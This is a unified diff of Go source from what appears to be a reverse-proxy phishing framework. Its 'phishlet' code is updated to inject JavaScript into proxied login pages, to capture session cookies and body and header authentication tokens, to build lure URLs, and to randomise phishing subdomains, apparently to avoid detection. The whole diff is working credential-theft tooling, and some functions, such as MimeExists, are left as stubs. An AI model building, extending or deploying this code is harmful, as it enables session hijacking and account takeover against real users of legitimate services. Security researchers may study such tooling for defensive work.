+	return ret
+}
+
+// GetCertPhishHosts returns phish hostnames that actually need TLS certificates.
+// It skips proxy_hosts whose original subdomain or domain contains 'disabled',
+// which indicates a federation provider param that hasn't been configured.
+// This prevents requesting unnecessary certs and hitting Let's Encrypt rate limits.
+func (p *Phishlet) GetCertPhishHosts() []string {
+	var ret []string
+	phishDomain, ok := p.cfg.GetSiteDomain(p.Name)
+	if ok {
+		for _, h := range p.proxyHosts {
+			// Skip hosts with disabled params (orig domain is unreachable)
+			if strings.Contains(h.orig_subdomain, "disabled") || strings.Contains(h.domain, "disabled") {
+				continue
+			}
 			ret = append(ret, combineHost(h.phish_subdomain, phishDomain))
 		}
 	}
 	return ret
 }
 
-func (p *Phishlet) GetLandingUrls(redirect_url string, inc_token bool) ([]string, error) {
-	var ret []string
-	host := p.cfg.GetBaseDomain()
+// GetProxyHosts returns proxy host info for external DNS management
+func (p *Phishlet) GetProxyHosts() []ProxyHostInfo {
+	var ret []ProxyHostInfo
 	for _, h := range p.proxyHosts {
-		if h.is_landing {
-			phishDomain, ok := p.cfg.GetSiteDomain(p.Site)
-			if ok {
-				host = combineHost(h.phish_subdomain, phishDomain)
-			}
-		}
+		ret = append(ret, ProxyHostInfo{
+			PhishSub: h.phish_subdomain,
+			OrigSub:  h.orig_subdomain,
+			Domain:   h.domain,
+		})
 	}
-	b64_param := ""
-	if redirect_url != "" {
-		_, err := url.ParseRequestURI(redirect_url)
-		if err != nil {
-			return nil, err
-		}
-		b64_param = base64.URLEncoding.EncodeToString([]byte(redirect_url))
-	}
-
-	for _, u := range p.landing_path {
-		purl := "https://" + host + u
-		if inc_token {
-			sep := "?"
-			for n := len(u) - 1; n >= 0; n-- {
-				switch u[n] {
-				case '/':
-				case '?':
-					sep = "&"
-				}
-			}
-			purl += sep + p.cfg.verificationParam + "=" + p.cfg.verificationToken
-			if b64_param != "" {
-				purl += "&" + p.cfg.redirectParam + "=" + url.QueryEscape(b64_param)
-			}
-		}
-		ret = append(ret, purl)
-	}
-	return ret, nil
+	return ret
 }
 
 func (p *Phishlet) GetLureUrl(path string) (string, error) {
@@ -598,7 +1122,7 @@ func (p *Phishlet) GetLureUrl(path string) (string, error) {
 	host := p.cfg.GetBaseDomain()
 	for _, h := range p.proxyHosts {
 		if h.is_landing {
-			phishDomain, ok := p.cfg.GetSiteDomain(p.Site)
+			phishDomain, ok := p.cfg.GetSiteDomain(p.Name)
 			if ok {
 				host = combineHost(h.phish_subdomain, phishDomain)
 			}
@@ -612,11 +1136,23 @@ func (p *Phishlet) GetLoginUrl() string {
 	return "https://" + p.login.domain + p.login.path
 }
 
-func (p *Phishlet) GetScriptInject(hostname, path string, params *map[string]string) (string, error) { //nolint:gocritic // false positive
+func (p *Phishlet) GetLandingPhishHost() string {
+	for _, ph := range p.proxyHosts {
+		if ph.is_landing {
+			phishDomain, ok := p.cfg.GetSiteDomain(p.Name)
+			if ok {
+				return combineHost(ph.phish_subdomain, phishDomain)
+			}
+		}
+	}
+	return ""
+}
+
+func (p *Phishlet) GetScriptInject(hostname string, path string, params *map[string]string) (string, string, error) {
 	for _, js := range p.js_inject {
 		host_matched := false
 		for _, h := range js.trigger_domains {
-			if strings.EqualFold(h, hostname) {
+			if h == strings.ToLower(hostname) {
 				host_matched = true
 				break
 			}
@@ -631,19 +1167,17 @@ func (p *Phishlet) GetScriptInject(hostname, path string, params *map[string]str
 			}
 			if path_matched {
 				params_matched := false
-				if len(js.trigger_params) == 0 {
-					// no trigger_params defined — always inject
-					params_matched = true
-				} else if params != nil {
-					// OR logic: inject if ANY trigger_param exists in session params
+				if params != nil {
+					pcnt := 0
 					for k := range *params {
 						if stringExists(k, js.trigger_params) {
-							params_matched = true
-							break
+							pcnt += 1
 						}
 					}
+					if pcnt == len(js.trigger_params) {
+						params_matched = true
+					}
 				} else {
-					// no session params yet — still inject, script handles missing params gracefully
 					params_matched = true
 				}
 
@@ -651,12 +1185,28 @@ func (p *Phishlet) GetScriptInject(hostname, path string, params *map[string]str
 					script := js.script
 					if params != nil {
 						for k, v := range *params {
-							script = strings.ReplaceAll(script, "{"+k+"}", v)
+							script = strings.Replace(script, "{"+k+"}", v, -1)
 						}
 					}
-					return script, nil
+					return js.id, script, nil
 				}
 			}
+		}
+	}
+	return "", "", fmt.Errorf("script not found")
+}
+
+func (p *Phishlet) GetScriptInjectById(id string, params *map[string]string) (string, error) {
+	for _, js := range p.js_inject {
+		if js.id == id {
+			script := js.script
+			if params != nil {
+				for k, v := range *params {
+					script = strings.Replace(script, "{"+k+"}", v, -1)
+				}
+			}
+
+			return script, nil
 		}
 	}
 	return "", fmt.Errorf("script not found")
@@ -665,7 +1215,7 @@ func (p *Phishlet) GetScriptInject(hostname, path string, params *map[string]str
 func (p *Phishlet) GenerateTokenSet(tokens map[string]string) map[string]map[string]string {
 	ret := make(map[string]map[string]string)
 	td := make(map[string]string)
-	for domain, tokens := range p.authTokens {
+	for domain, tokens := range p.cookieAuthTokens {
 		ret[domain] = make(map[string]string)
 		for _, t := range tokens {
 			td[t.name] = domain
@@ -680,10 +1230,18 @@ func (p *Phishlet) GenerateTokenSet(tokens map[string]string) map[string]map[str
 	return ret
 }
 
-func (p *Phishlet) addProxyHost(phish_subdomain, orig_subdomain, domain string, handle_session, is_landing, auto_filter bool) {
+func (p *Phishlet) addProxyHost(phish_subdomain string, orig_subdomain string, domain string, handle_session bool, is_landing bool, auto_filter bool) {
 	phish_subdomain = strings.ToLower(phish_subdomain)
 	orig_subdomain = strings.ToLower(orig_subdomain)
 	domain = strings.ToLower(domain)
+
+	// Auto-randomize subdomain when randomize_subdomains is enabled
+	if p.cfg != nil && p.cfg.IsRandomizeSubdomainsEnabled() {
+		origKey := orig_subdomain + "." + domain
+		phish_subdomain = p.cfg.GetOrCreateRandomSub(p.Name, origKey)
+		log.Debug("[phishlet:%s] randomized subdomain: %s.%s -> %s", p.Name, orig_subdomain, domain, phish_subdomain)
+	}
+
 	if !p.domainExists(domain) {
 		p.domains = append(p.domains, domain)
 	}
@@ -691,29 +1249,31 @@ func (p *Phishlet) addProxyHost(phish_subdomain, orig_subdomain, domain string, 
 	p.proxyHosts = append(p.proxyHosts, ProxyHost{phish_subdomain: phish_subdomain, orig_subdomain: orig_subdomain, domain: domain, handle_session: handle_session, is_landing: is_landing, auto_filter: auto_filter})
 }
 
-func (p *Phishlet) addSubFilter(hostname, subdomain, domain string, mime []string, regex, replace string, redirect_only bool, with_params []string) {
+func (p *Phishlet) addSubFilter(hostname string, subdomain string, domain string, mime []string, regexp string, replace string, redirect_only bool, with_params []string) {
 	hostname = strings.ToLower(hostname)
 	subdomain = strings.ToLower(subdomain)
 	domain = strings.ToLower(domain)
 	for n := range mime {
 		mime[n] = strings.ToLower(mime[n])
 	}
-	p.subfilters[hostname] = append(p.subfilters[hostname], SubFilter{subdomain: subdomain, domain: domain, mime: mime, regexp: regex, replace: replace, redirect_only: redirect_only, with_params: with_params})
+	p.subfilters[hostname] = append(p.subfilters[hostname], SubFilter{subdomain: subdomain, domain: domain, mime: mime, regexp: regexp, replace: replace, redirect_only: redirect_only, with_params: with_params})
 }
 
-func (p *Phishlet) addAuthTokens(hostname string, tokens []string) error {
-	p.authTokens[hostname] = []*AuthToken{}
+func (p *Phishlet) addCookieAuthTokens(hostname string, tokens []string) error {
+	p.cookieAuthTokens[hostname] = []*CookieAuthToken{}
 	for _, tk := range tokens {
-		st := strings.Split(tk, ",")
+		st := strings.Split(tk, ":")
+		if len(st) == 1 {
+			st = strings.Split(tk, ",")
+		}
 		if len(st) > 0 {
 			name := st[0]
-			at := &AuthToken{
+			at := &CookieAuthToken{
 				name:      name,
 				re:        nil,
 				http_only: false,
 				optional:  false,
-				secure:    false,
-				host_only: false,
+				always:    false,
 			}
 			for i := 1; i < len(st); i++ {
 				switch st[i] {
@@ -725,16 +1285,56 @@ func (p *Phishlet) addAuthTokens(hostname string, tokens []string) error {
 					}
 				case "opt":
 					at.optional = true
+				case "always":
+					at.always = true
 				}
 			}
-			p.authTokens[hostname] = append(p.authTokens[hostname], at)
+			p.cookieAuthTokens[hostname] = append(p.cookieAuthTokens[hostname], at)
 		}
 	}
 	return nil
 }
 
-func (p *Phishlet) addJsInject(trigger_domains, trigger_paths, trigger_params []string, script string) error {
-	js := JsInject{}
+func (p *Phishlet) addBodyAuthToken(hostname string, path string, name string, search string) error {
+	path_re, err := regexp.Compile(path)
+	if err != nil {
+		return err
+	}
+	search_re, err := regexp.Compile(search)
+	if err != nil {
+		return err
+	}
+
+	p.bodyAuthTokens[name] = &BodyAuthToken{
+		domain: hostname,
+		path:   path_re,
+		name:   name,
+		search: search_re,
+	}
+
+	return nil
+}
+
+func (p *Phishlet) addHttpAuthToken(hostname string, path string, name string, header string) error {
+	path_re, err := regexp.Compile(path)
+	if err != nil {
+		return err
+	}
+
+	p.httpAuthTokens[name] = &HttpAuthToken{
+		domain: hostname,
+		path:   path_re,
+		name:   name,
+		header: header,
+	}
+
+	return nil
+}
+
+func (p *Phishlet) addJsInject(trigger_domains []string, trigger_paths []string, trigger_params []string, script string) error {
+	js := JsInject{
+		id: GenRandomToken(),
+	}
 	for _, d := range trigger_domains {
 		js.trigger_domains = append(js.trigger_domains, strings.ToLower(d))
 	}
@@ -755,6 +1355,18 @@ func (p *Phishlet) addJsInject(trigger_domains, trigger_paths, trigger_params []
 	return nil
 }
 
+func (p *Phishlet) addIntercept(domain string, path *regexp.Regexp, http_status int, body string, mime string) error {
+	ic := Intercept{
+		domain:      strings.ToLower(domain),
+		path:        path,
+		http_status: http_status,
+		body:        body,
+		mime:        mime,
+	}
+	p.intercept = append(p.intercept, ic)
+	return nil
+}
+
 func (p *Phishlet) domainExists(domain string) bool {
 	for _, d := range p.domains {
 		if domain == d {
@@ -764,8 +1376,8 @@ func (p *Phishlet) domainExists(domain string) bool {
 	return false
 }
 
-func (p *Phishlet) getAuthToken(domain, token string) *AuthToken {
-	if tokens, ok := p.authTokens[domain]; ok {
+func (p *Phishlet) getAuthToken(domain string, token string) *CookieAuthToken {
+	if tokens, ok := p.cookieAuthTokens[domain]; ok {
 		for _, at := range tokens {
 			if at.re != nil {
 				if at.re.MatchString(token) {
@@ -779,23 +1391,21 @@ func (p *Phishlet) getAuthToken(domain, token string) *AuthToken {
 	return nil
 }
 
-func (p *Phishlet) isAuthToken(domain, token string) bool {
+func (p *Phishlet) isAuthToken(domain string, token string) bool {
 	if at := p.getAuthToken(domain, token); at != nil {
 		return true
 	}
 	return false
 }
 
-func (p *Phishlet) MimeExists(mime string) bool {
-	for _, sfs := range p.subfilters {
-		for _, sf := range sfs {
-			for _, m := range sf.mime {
-				if m == mime {
-					return true
-				}
-			}
-		}
+func (p *Phishlet) isTokenHttpOnly(domain string, token string) bool {
+	if at := p.getAuthToken(domain, token); at != nil {
+		return at.http_only
 	}
+	return false
+}
+
+func (p *Phishlet) MimeExists(mime string) bool {
 	return false
 }
 
@@ -834,4 +1444,14 @@ func (p *Phishlet) parseVersion(ver string) (PhishletVersion, error) {
 		return ret, err
 	}
 	return ret, nil
+}
+
+func (p *Phishlet) paramVal(s string) string {
+	var ret string = s
+	if !p.isTemplate {
+		for k, v := range p.customParams {
+			ret = strings.ReplaceAll(ret, "{"+k+"}", v)
+		}
+	}
+	return ret
 }
